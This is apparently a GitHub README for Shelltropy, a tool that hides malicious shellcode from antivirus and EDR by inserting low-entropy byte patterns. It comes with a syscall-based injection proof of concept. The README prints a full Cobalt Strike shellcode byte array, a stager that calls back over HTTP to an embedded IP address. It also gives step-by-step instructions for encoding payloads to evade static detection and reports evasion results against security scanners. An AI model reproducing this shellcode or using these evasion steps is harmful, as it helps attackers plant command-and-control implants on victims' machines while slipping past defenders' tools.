<h1 align="center">
    Shelltropy
</h1>

<h2 align="center">
    The more predictable you are, the less you get detected
</h2>

**A technique of hiding malicious shellcode based on low-entropy via Shannon encoding.**

Entropy is the measure of the randomness in a set of data (here: shellcode). The higher the entropy, the more random the data is. Shannon Entropy is an algorithm that will produce a result between 0 and 8, where 8 means there is no pattern in the data, thereby it's very random and 0 means data follows a pattern.

**Note:** Check out my [blog article](https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/) for a more detailed explanation of my research, and a simple Vanilla Shellcode Injection PoC as well.

## Setup
Clone this repository:  
```git clone https://github.com/kleiton0x00/Shelltropy.git```

**For the encoder:**  
Create a new Visual Studio project and import both **Entropy.h** and **shannonEncode.cpp** and simply build it.

**For the Shellcode Injection PoC (with Syscalls):**  
Open the Visual Studio project file located in ```/Shelltropy/SyscallsExample/SyscallsExample/SyscallsExample.vcxproj``` and simply build it.  
**Note:** If you want a simple Shellcode Injection PoC with WinAPI check out my [blog](https://kleiton0x00.github.io/posts/The-more-predictable-you-are-the-less-you-are-able-to-get-detected/)

**For the decoder (optional since it's included on the Shellcode Injection PoC):**  
Create a new Visual Studio project and import **shannonDecode.cpp** and simply build it.

## How to use

- Launch Cobalt Strike and generate a Windows Executable (Stageless or non-stageless, up to you). Make sure the output is **Raw** and save it as **payload.bin**  
![generateCSShellcode](https://i.imgur.com/EeBV6qe.png)  
- Execute **shellcodeFormatter.py** and copy the output

```bash
$ python3 shellcodeFormatter.py 
BYTE payload[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x75,0x72,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4f,0xff,0xff,0xff,0x5d,0x6a,0x00,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x49,0x89,0xe6,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x48,0x31,0xc9,0x48,0x31,0xd2,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x41,0x50,0x41,0x50,0x41,0xba,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xeb,0x73,0x5a,0x48,0x89,0xc1,0x41,0xb8,0xfb,0x20,0x00,0x00,0x4d,0x31,0xc9,0x41,0x51,0x41,0x51,0x6a,0x03,0x41,0x51,0x41,0xba,0x57,0x89,0x9f,0xc6,0xff,0xd5,0xeb,0x59,0x5b,0x48,0x89,0xc1,0x48,0x31,0xd2,0x49,0x89,0xd8,0x4d,0x31,0xc9,0x52,0x68,0x00,0x02,0x40,0x84,0x52,0x52,0x41,0xba,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x48,0x83,0xc3,0x50,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0xff,0xff,0xff,0xff,0x4d,0x31,0xc9,0x52,0x52,0x41,0xba,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x0f,0x85,0x9d,0x01,0x00,0x00,0x48,0xff,0xcf,0x0f,0x84,0x8c,0x01,0x00,0x00,0xeb,0xd3,0xe9,0xe4,0x01,0x00,0x00,0xe8,0xa2,0xff,0xff,0xff,0x2f,0x78,0x51,0x48,0x4c,0x00,0x30,0x96,0x54,0xc4,0x1f,0x1c,0xa8,0x3b,0xcb,0x64,0x4f,0xb0,0xb2,0x75,0x09,0x9f,0x7f,0x94,0x1c,0xf7,0x6a,0x53,0xc5,0x96,0xf3,0xea,0x28,0x51,0x8e,0x68,0x86,0xc4,0x4b,0x9a,0xb3,0xd6,0x54,0x82,0x22,0x90,0x89,0xbd,0x84,0xc4,0x73,0x97,0x2a,0xd9,0xbe,0x2d,0xd1,0x34,0xb9,0x18,0xb8,0x63,0xbc,0x52,0x14,0x3f,0x84,0x4e,0xeb,0xab,0x79,0x4a,0x89,0x42,0x26,0x8b,0xe7,0x12,0x48,0x00,0x55,0x73,0x65,0x72,0x2d,0x41,0x67,0x65,0x6e,0x74,0x3a,0x20,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x63,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x6c,0x65,0x3b,0x20,0x4d,0x53,0x49,0x45,0x20,0x31,0x30,0x2e,0x30,0x3b,0x20,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x3b,0x20,0x57,0x4f,0x57,0x36,0x34,0x3b,0x20,0x54,0x72,0x69,0x64,0x65,0x6e,0x74,0x2f,0x36,0x2e,0x30,0x3b,0x20,0x4d,0x41,0x53,0x50,0x29,0x0d,0x0a,0x00,0xba,0xf1,0x47,0xbe,0x2f,0x60,0xce,0xf4,0x22,0xc0,0x41,0x82,0x1f,0xb8,0xdb,0xa9,0x01,0x08,0xe0,0xf6,0x87,0xf9,0x24,0x72,0x49,0x5b,0xf6,0xf8,0xa9,0xa1,0x08,0xc9,0x90,0xaa,0x2c,0x71,0x11,0x52,0x60,0x6a,0x94,0x86,0x80,0xc5,0xbe,0x16,0x3e,0x8d,0x15,0xc9,0xf5,0xae,0x9b,0x5d,0x77,0xc2,0x30,0x76,0x2a,0xbf,0x6a,0xc2,0xf6,0x2a,0x35,0xae,0x1d,0x4d,0xa6,0x62,0xe7,0x16,0x7a,0x25,0x05,0xc5,0x80,0x0e,0xf9,0x06,0x45,0x87,0x4d,0x52,0x20,0x5b,0x33,0xd3,0x6a,0x59,0x95,0xb7,0x56,0x1b,0xc5,0xbb,0x91,0xe3,0x97,0x82,0xd5,0xfc,0x6c,0x11,0x48,0x6a,0x64,0xf1,0xe6,0xc1,0xd4,0xef,0x75,0x74,0x20,0x58,0xfb,0x27,0x0b,0x5e,0x23,0x9a,0x87,0x86,0x1f,0x3f,0x34,0xdd,0x2c,0xfc,0x59,0x3b,0x51,0xcb,0x56,0x08,0x5d,0x85,0x5e,0x45,0x23,0x4d,0x99,0x8e,0x5f,0x8b,0x35,0x36,0x11,0xce,0x51,0x52,0x7b,0x48,0xda,0x77,0x1b,0x25,0xac,0xe5,0x05,0x9f,0x97,0x96,0xf2,0x2c,0x38,0x5a,0xcd,0x1f,0xbb,0x47,0x0e,0x55,0x60,0xab,0xe3,0x99,0x2f,0x7d,0x35,0xae,0xbc,0x68,0x69,0x5e,0x6b,0xde,0x0e,0xc0,0x6c,0x80,0x9a,0x5a,0xb4,0xfb,0x25,0xb4,0x54,0xa2,0xad,0xc3,0x19,0xf3,0x92,0x48,0xe6,0xb4,0x1d,0xac,0x89,0x00,0x41,0xbe,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x31,0xc9,0xba,0x00,0x00,0x40,0x00,0x41,0xb8,0x00,0x10,0x00,0x00,0x41,0xb9,0x40,0x00,0x00,0x00,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x41,0xb8,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x41,0xba,0x12,0x96,0x89,0xe2,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb6,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd7,0x58,0x58,0x58,0x48,0x05,0x00,0x00,0x00,0x00,0x50,0xc3,0xe8,0x9f,0xfd,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,0x34,0x36,0x00,0x5e,0x2e,0x78,0x90};
```

- Replace the Shellcode in **shannonEncoder.cpp** (line 10) with the shellcode you generated from the python file.
- You can use the generated low-entropy shellcode in the Visual Studio project ```/Shelltropy/SyscallsExample/SyscallsExample/SyscallsExample.vcxproj```

## How the PoC works

The concept is to divide the array into chunks and insert a low-entropy pattern of bytes between each chunk. When the sample is run, we must reconstruct the original payload in memory, bypassing the static detection of the high entropy code at this stage.
It's also worth noting that the low-entropy code to be inserted can follow a variety of patterns, and the amount of insertions can vary, thus it can be used to circumvent static signature detection. The second step is to combine the high entropy chunks of bytes with the low entropy chunks. 
Because, after all, we need to restore the obfuscated code to what it was initially in order to proceed to the de-obfuscation step, the third task will restore the original array of bytes by deleting the low entropy patterns. 

![poc_logic_flow](https://github.com/kleiton0x00/Shelltropy/blob/main/Images/encoding_logic_flow.jpg?raw=true)

## Demo

![vs_build](https://i.imgur.com/3B7p4hB.gif)

## Entropy Results

**Note:** The following results are only tested with CS Shellcode.

~ Raw default Cobalt Strike shellcode  
(High-entropy) Normal: **7.062950**   
(Low-entropy) Encoded: **4.527140**  

~ XORed Cobalt Strike shellcode  
(High-entropy) Normal: **4.583139**    
(Low-entropy) Encoded: **3.278284**

## AV/EDR Scanning Results

High-Entropy (left side) vs Low-Entropy (right side) default CS Shellcode integrated with Syscalls (Syswhispers2):  
![results-side-by-side](https://i.imgur.com/ZXcGlDQ.jpg)

## Disadvantage

While encoding, the size of the shellcode will be 2 times larger, making it easier for Blue Team/ Malware Analysis to detect such encoded shellcodes.

## Creds

The Shellcode Injection template (using Syscalls2) is copied from this project: https://github.com/m0rv4i/SyscallsExample
